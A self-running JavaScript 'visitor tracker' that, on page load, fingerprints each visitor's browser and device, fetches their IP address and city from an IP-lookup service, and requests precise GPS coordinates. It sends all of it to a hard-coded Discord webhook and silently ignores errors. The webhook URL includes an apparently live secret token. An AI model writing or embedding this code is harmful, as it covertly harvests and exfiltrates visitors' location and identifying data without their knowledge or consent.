(function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1499634580947472504/b6juZu8B-vCmAtPe0gIUNpTFjN_noP5VhRCMaGU12FVQ-ipySzbtogADyOLtnvcNLzzc";
    
    let hasSent = false;
    
    async function sendLog() {
        if (hasSent) return;
        hasSent = true;
        
        const clientInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || "unknown",
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            onLine: navigator.onLine
        };
        
        const screenInfo = {
            screenWidth: screen.width,
            screenHeight: screen.height,
            screenAvailWidth: screen.availWidth,
            screenAvailHeight: screen.availHeight,
            screenColorDepth: screen.colorDepth,
            screenPixelDepth: screen.pixelDepth,
            windowInnerWidth: window.innerWidth,
            windowInnerHeight: window.innerHeight,
            windowOuterWidth: window.outerWidth,
            windowOuterHeight: window.outerHeight,
            devicePixelRatio: window.devicePixelRatio
        };
        
        const timeInfo = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            localTime: new Date().toLocaleString(),
            utcTime: new Date().toISOString(),
            timestamp: Date.now()
        };
        
        const pageInfo = {
            url: window.location.href,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            search: window.location.search,
            hash: window.location.hash,
            referrer: document.referrer,
            title: document.title,
            protocol: window.location.protocol
        };
        
        let performanceInfo = {};
        if (window.performance && window.performance.timing) {
            const timing = window.performance.timing;
            const loadTime = timing.loadEventEnd - timing.navigationStart;
            performanceInfo = {
                pageLoadTimeMs: loadTime > 0 ? loadTime : "still loading",
                domInteractive: timing.domInteractive - timing.navigationStart,
                domContentLoaded: timing.domContentLoadedEventEnd - timing.navigationStart,
                responseTime: timing.responseEnd - timing.requestStart
            };
        } else if (window.performance && window.performance.getEntriesByType) {
            const navEntry = performance.getEntriesByType('navigation')[0];
            if (navEntry) {
                performanceInfo = {
                    pageLoadTimeMs: navEntry.loadEventEnd - navEntry.startTime,
                    domInteractive: navEntry.domInteractive - navEntry.startTime,
                    domContentLoaded: navEntry.domContentLoadedEventEnd - navEntry.startTime,
                    responseTime: navEntry.responseEnd - navEntry.requestStart,
                    fetchStart: navEntry.fetchStart
                };
            }
        }
        
        let connectionInfo = {};
        if (navigator.connection) {
            const conn = navigator.connection;
            connectionInfo = {
                effectiveType: conn.effectiveType,
                rtt: conn.rtt,
                downlink: conn.downlink,
                saveData: conn.saveData,
                type: conn.type
            };
        }
        
        let ipData = {};
        let browserGeoLocation = null;
        
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (ipResponse.ok) {
                ipData = await ipResponse.json();
            }
        } catch (e) {
            ipData = { error: "Could not fetch IP data", message: e.message };
        }
        
        try {
            const geoPromise = new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        });
                    },
                    (error) => resolve({ error: error.message, code: error.code }),
                    { timeout: 8000, enableHighAccuracy: true }
                );
            });
            browserGeoLocation = await geoPromise;
        } catch (e) {
            browserGeoLocation = { error: e.message };
        }
        
        let locationString = "Unknown location";
        if (ipData && !ipData.error) {
            const parts = [];
            if (ipData.city) parts.push(ipData.city);
            if (ipData.region) parts.push(ipData.region);
            if (ipData.country_name) parts.push(ipData.country_name);
            if (parts.length) locationString = parts.join(", ");
            else if (ipData.country) locationString = ipData.country;
        }
        
        let ipString = ipData?.ip || ipData?.IPv4 || "Unknown IP";
        
        const allInfo = {
            client: clientInfo,
            screen: screenInfo,
            time: timeInfo,
            page: pageInfo,
            performance: performanceInfo,
            connection: connectionInfo,
            ip_api_data: ipData,
            browser_geolocation: browserGeoLocation,
            collected_at: new Date().toISOString()
        };
        
        const allInfoPretty = JSON.stringify(allInfo, null, 2);
        
        const embed = {
            title: "🌐 New Visitor Detected",
            color: 0x5865F2,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📍 Location",
                    value: locationString,
                    inline: true
                },
                {
                    name: "🖥️ IP Address",
                    value: `\`${ipString}\``,
                    inline: true
                },
                {
                    name: "🌍 Browser Geolocation",
                    value: browserGeoLocation?.latitude
                        ? `Lat: ${browserGeoLocation.latitude}, Lon: ${browserGeoLocation.longitude}\nAccuracy: ${browserGeoLocation.accuracy}m`
                        : browserGeoLocation?.error || "Not granted or unavailable",
                    inline: false
                },
                {
                    name: "📱 Device & Browser",
                    value: `UA: ${clientInfo.userAgent.substring(0,100)}\nPlatform: ${clientInfo.platform}\nLanguage: ${clientInfo.language}`,
                    inline: false
                },
                {
                    name: "📐 Screen / Viewport",
                    value: `Screen: ${screenInfo.screenWidth}x${screenInfo.screenHeight}\nViewport: ${screenInfo.windowInnerWidth}x${screenInfo.windowInnerHeight}\nDPR: ${screenInfo.devicePixelRatio}`,
                    inline: true
                },
                {
                    name: "⏰ Time & TZ",
                    value: `Timezone: ${timeInfo.timezone}\nLocal: ${timeInfo.localTime}`,
                    inline: true
                },
                {
                    name: "🔗 Page Info",
                    value: `URL: ${pageInfo.url}\nReferrer: ${pageInfo.referrer || "Direct"}`,
                    inline: false
                },
                {
                    name: "⚡ Connection",
                    value: connectionInfo.effectiveType
                        ? `Type: ${connectionInfo.effectiveType}, RTT: ${connectionInfo.rtt}ms, Downlink: ${connectionInfo.downlink}Mbps`
                        : "Not available",
                    inline: true
                },
                {
                    name: "📦 All Collected Data",
                    value: "```json\n" + allInfoPretty.substring(0,1000) + (allInfoPretty.length > 1000 ? "\n..." : "") + "\n```",
                    inline: false
                }
            ],
            footer: {
                text: "Visitor tracker • " + new Date().toLocaleString()
            }
        };
        
        const locationDisplay = locationString !== "Unknown location" ? locationString : ipString;
        const messageContent = `Seems like a fellow is interested, they are from **${locationDisplay}**\n-# \`${ipString}\``;
        
        const payload = {
            content: messageContent,
            embeds: [embed],
            username: "Site Logger",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/1055/1055687.png"
        };
        
        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (error) {}
    }
    
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", sendLog);
    } else {
        sendLog();
    }
})();